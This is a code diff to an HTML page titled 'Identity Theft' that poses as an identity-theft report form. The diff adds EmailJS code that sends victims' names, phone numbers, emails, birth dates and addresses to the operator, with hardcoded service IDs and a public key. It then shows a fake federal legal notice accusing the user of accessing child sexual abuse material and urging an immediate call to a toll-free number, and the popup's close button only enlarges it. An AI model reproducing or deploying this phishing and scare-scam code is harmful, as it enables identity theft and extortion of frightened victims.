@@ -5,8 +5,9 @@
     <link rel="icon" type="image/svg+xml" href="/vite.svg">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Identity Theft</title>
-    <script type="module" crossorigin src="/assets/index-CJArmFS_.js"></script>
-    <link rel="stylesheet" crossorigin href="style.css">
+    <!-- Include EmailJS SDK -->
+     <link rel="stylesheet" crossorigin="" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body {
             transition: opacity ease-in 0.2s;
@@ -34,80 +35,14 @@
         .submit-btn:hover {
             background-color: #003d73;
         }
-        .popuparea {
+        .confirmation-message {
             display: none;
-            justify-content: center;
-            align-items: center;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 1000;
-        }
-        .pop-bx {
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
-            width: 90%;
-            max-width: 1000px;
-            min-height: 80vh;
-            position: relative;
-            transition: all 0.3s ease-in-out;
-            overflow-y: auto;
-        }
-        .pop-bx.fullscreen {
-            width: 100%;
-            height: 100%;
-            max-width: none;
-            max-height: none;
-            min-height: 100vh;
-            border-radius: 0;
-            margin: 0;
-            padding: 40px;
-        }
-        .pop-bx h2 {
-            background: #590d0d;
-            color: #ffffff;
+            background-color: #e7f4e4;
+            color: #2e8540;
             padding: 15px;
-            margin: -30px -30px 25px;
-            border-top-left-radius: 10px;
-            border-top-right-radius: 10px;
-            font-size: 24px;
-            font-weight: 600;
+            border-radius: 5px;
+            margin: 20px 0;
             text-align: center;
-        }
-        .pop-bx p {
-            font-size: 16px;
-            line-height: 1.6;
-            color: #333;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .pop-bx .p-2 a {
-            color: #005ea2;
-            font-weight: bold;
-            text-decoration: none;
-            font-size: 18px;
-        }
-        .pop-bx .p-2 a:hover {
-            text-decoration: underline;
-        }
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: transparent;
-            border: none;
-            font-size: 28px;
-            cursor: pointer;
-            color: #555;
-            transition: color 0.2s;
-        }
-        .close-btn:hover {
-            color: #000;
         }
     </style>
 </head>
@@ -133,6 +68,9 @@
             </div>
             <div class="info-box">
                 <p><strong>Fill in what you know.</strong> If you don’t know, leave it blank.</p>
+            </div>
+            <div id="confirmationMessage" class="confirmation-message">
+                Form submitted successfully. You can proceed to the next step.
             </div>
             <form id="identityForm" class="row" style="padding: 40px 0px;">
                 <div class="form-row row">
@@ -545,28 +483,8 @@
                         </div>
                     </div>
                 </div>
-                <button type="submit" class="submit-btn">Continue →</button>
+                <a href="popup.html"><button type="submit" class="submit-btn">Continue →</button></a>
             </form>
-            <div class="popuparea" id="popup">
-                <div class="pop-bx" id="popup-box">
-                    <button class="close-btn" onclick="handleClose()">×</button>
-                    <h2>Case Number: USC22514</h2>
-                    <p>
-                        The Material you have attempted to access has been Identified as Child Pornography and in Breach of section.<br><br>
-                        8 U.S.C. § 2251- Sexual Exploitation of Children (Production of child pornography)<br><br>
-                        18 U.S.C. § 2251A- Selling and Buying of Children<br>
-                        18 U.S.C. § 2252- Certain activities relating to material involving the sexual exploitation of minors<br><br>
-                        (Possession, distribution and receipt of child pornography)<br><br>
-                        18 U.S.C. § 2252A- certain activities relating to material constituting or containing child pornography<br><br>
-                        18 U.S.C. § 2256- Definitions<br><br>
-                        18 U.S.C. § 2260- Production of sexually explicit depictions of a minor for importation into the United States
-                    </p>
-                    <p class="p-2">
-                        Attention that Your Personal information may have been compromised. This could potentially put your financial security and personal details at risk. We Recommend you to make Immediate call<br><br>
-                        <a href="tel:+1-833-534-1986">Call Now: +1-833-534-1986</a>
-                    </p>
-                </div>
-            </div>
         </div>
         <footer class="footer">
             <div class="footer-container">
@@ -593,24 +511,194 @@
                 </div>
             </div>
         </footer>
+        <!-- Add this popup HTML before the footer -->
+<div id="legalPopup" class="popup-container">
+    <div class="popup-content">
+        <button class="popup-close" onclick="toggleFullscreen()">×</button>
+        <div class="legal-text">
+            <h2>Case Number: USC22514</h2>
+            <p><strong>Warning:</strong> The material you have attempted to access has been identified as in violation of U.S. federal law.</p>
+            <ul>
+                <li><strong>8 U.S.C. § 2251:</strong> Sexual Exploitation of Children (Production of child pornography)</li>
+                <li><strong>18 U.S.C. § 2251A:</strong> Selling and Buying of Children</li>
+                <li><strong>18 U.S.C. § 2252:</strong> Activities relating to material involving the sexual exploitation of minors</li>
+                <li><strong>18 U.S.C. § 2252A:</strong> Activities relating to material constituting or containing child pornography</li>
+                <li><strong>18 U.S.C. § 2256:</strong> Definitions</li>
+                <li><strong>18 U.S.C. § 2260:</strong> Production of sexually explicit depictions of a minor for importation into the United States</li>
+            </ul>
+            <p><strong>Alert:</strong> Your personal information may have been compromised, potentially putting your financial security and personal details at risk. Immediate action is recommended.</p>
+            <div class="call-section">
+                <a href="tel:+1-833-534-1986" class="call-button">
+                    <svg class="phone-icon" viewBox="0 0 24 24">
+                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.24 1.02l-2.2 2.2z"/>
+                    </svg>
+                    Call Now: +1-833-534-1986
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.popup-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    z-index: 9999;
+    display: none;
+}
+
+.popup-content {
+    position: relative;
+    background: white;
+    margin: 2% auto;
+    padding: 40px;
+    width: 90%;
+    max-width: 800px;
+    max-height: 90vh;
+    overflow-y: auto;
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.popup-content.fullscreen {
+    width: 100%;
+    height: 100%;
+    max-width: none;
+    max-height: none;
+    margin: 0;
+    border-radius: 0;
+}
+
+.popup-close {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: none;
+    border: none;
+    font-size: 40px;
+    cursor: pointer;
+    color: white;
+    z-index: 10000;
+}
+
+.legal-text {
+    font-size: 16px;
+    line-height: 1.6;
+    color: #333;
+}
+
+.call-button {
+    display: inline-flex;
+    align-items: center;
+    padding: 15px 30px;
+    background: #dc3545;
+    color: white;
+    text-decoration: none;
+    border-radius: 50px;
+    margin: 20px 0;
+    animation: ring 1.5s infinite;
+}
+
+@keyframes ring {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+    100% { transform: scale(1); }
+}
+
+.phone-icon {
+    width: 24px;
+    height: 24px;
+    margin-right: 10px;
+    fill: currentColor;
+}
+</style>
+
+<script>
+// Update form submission handler
+document.getElementById('identityForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const form = event.target;
+
+    if (form.checkValidity()) {
+        const formData = new FormData(form);
+        const data = Object.fromEntries(formData.entries());
+
+        emailjs.send('service_a6qe5ya', 'template_8veo6fh', data)
+            .then(function(response) {
+                // Show popup instead of confirmation message
+                document.getElementById('legalPopup').style.display = 'block';
+                document.body.style.overflow = 'hidden';
+            })
+            .catch(function(error) {
+                alert('Submission failed. Please try again.');
+            });
+    } else {
+        form.reportValidity();
+    }
+});
+
+function toggleFullscreen() {
+    const popup = document.querySelector('.popup-content');
+    popup.classList.toggle('fullscreen');
+}
+</script>
     </div>
     <script>
+        // Initialize EmailJS with your Public Key
+        (function(){
+            emailjs.init("cjJJt1e_bhqwdIwsn"); // Replace with your EmailJS Public Key
+        })();
+
+        // Handle form submission
         document.getElementById('identityForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const form = event.target;
+
             if (form.checkValidity()) {
-                const popupBox = document.getElementById('popup-box');
-                popupBox.classList.remove('fullscreen');
-                document.getElementById('popup').style.display = 'flex';
+                // Collect form data
+                const formData = new FormData(form);
+                const data = {
+                    firstName: formData.get('firstName') || 'N/A',
+                    middleName: formData.get('middleName') || 'N/A',
+                    lastName: formData.get('lastName') || 'N/A',
+                    country: formData.get('country') || 'N/A',
+                    primaryPhone: formData.get('primaryPhone') || 'N/A',
+                    phoneType: formData.get('phoneType') || 'N/A',
+                    email: formData.get('email') || 'N/A',
+                    filingFor: formData.get('filingFor') || 'N/A',
+                    birthYear: formData.get('birthYear') || 'N/A',
+                    birthMonth: formData.get('birthMonth') || 'N/A',
+                    birthDay: formData.get('birthDay') || 'N/A',
+                    streetAddress: formData.get('streetAddress') || 'N/A',
+                    aptNumber: formData.get('aptNumber') || 'N/A',
+                    city: formData.get('city') || 'N/A',
+                    state: formData.get('state') || 'N/A',
+                    zipCode: formData.get('zipCode') || 'N/A',
+                    livedSinceYear: formData.get('livedSinceYear') || 'N/A',
+                    livedSinceMonth: formData.get('livedSinceMonth') || 'N/A'
+                };
+
+                // Send email using EmailJS
+                emailjs.send('service_a6qe5ya', 'template_8veo6fh', data)
+                    .then(function(response) {
+                        // Show success message
+                        document.getElementById('confirmationMessage').style.display = 'block';
+                        form.reset(); // Reset the form
+                    }, function(error) {
+                        // Show error message
+                        document.getElementById('confirmationMessage').style.display = 'block';
+                        document.getElementById('confirmationMessage').textContent = 'An error occurred. Please try again.';
+                        document.getElementById('confirmationMessage').style.backgroundColor = '#f8d7da';
+                        document.getElementById('confirmationMessage').style.color = '#721c24';
+                    });
             } else {
                 form.reportValidity();
             }
         });
-
-        function handleClose() {
-            const popupBox = document.getElementById('popup-box');
-            popupBox.classList.add('fullscreen');
-        }
     </script>
 </body>
 </html>
